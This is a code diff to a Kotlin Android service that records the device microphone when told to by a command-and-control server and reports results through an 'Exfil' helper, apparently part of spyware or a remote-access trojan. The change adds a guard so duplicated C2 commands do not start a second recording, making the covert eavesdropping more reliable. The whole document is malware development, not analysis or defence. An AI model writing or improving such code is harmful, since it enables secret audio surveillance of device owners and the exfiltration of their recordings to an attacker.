@@ -19,6 +19,14 @@ class MicRecorder : Service() {
     private var recorder: MediaRecorder? = null
     private var outFile: File? = null
 
+    companion object {
+        /* A duplicated command (the C2 delivered it twice) must not start a
+           second recorder on top of the running one - the second one would
+           fail and report "no_audio". */
+        @Volatile
+        private var busy = false
+    }
+
     override fun onCreate() {
         super.onCreate()
         // The service runs with the "microphone" type - without it Android 14+
@@ -41,6 +49,12 @@ class MicRecorder : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (busy) {
+            Exfil.sendLog(this, "cmd_result", """{"cmd":"mic","ok":false,"reason":"busy"}""")
+            stopSelf()
+            return START_NOT_STICKY
+        }
+        busy = true
         val duration = intent?.getIntExtra("seconds", 60) ?: 60
         startRecording(duration)
         return START_NOT_STICKY
@@ -66,6 +80,7 @@ class MicRecorder : Service() {
                 this, "cmd_result",
                 """{"cmd":"mic","ok":false,"reason":"${t.javaClass.simpleName}"}"""
             )
+            busy = false
             stopSelf()
         }
     }
@@ -84,6 +99,7 @@ class MicRecorder : Service() {
         } else {
             Exfil.sendLog(this, "cmd_result", """{"cmd":"mic","ok":false,"reason":"no_audio"}""")
         }
+        busy = false
         stopSelf()
     }
 
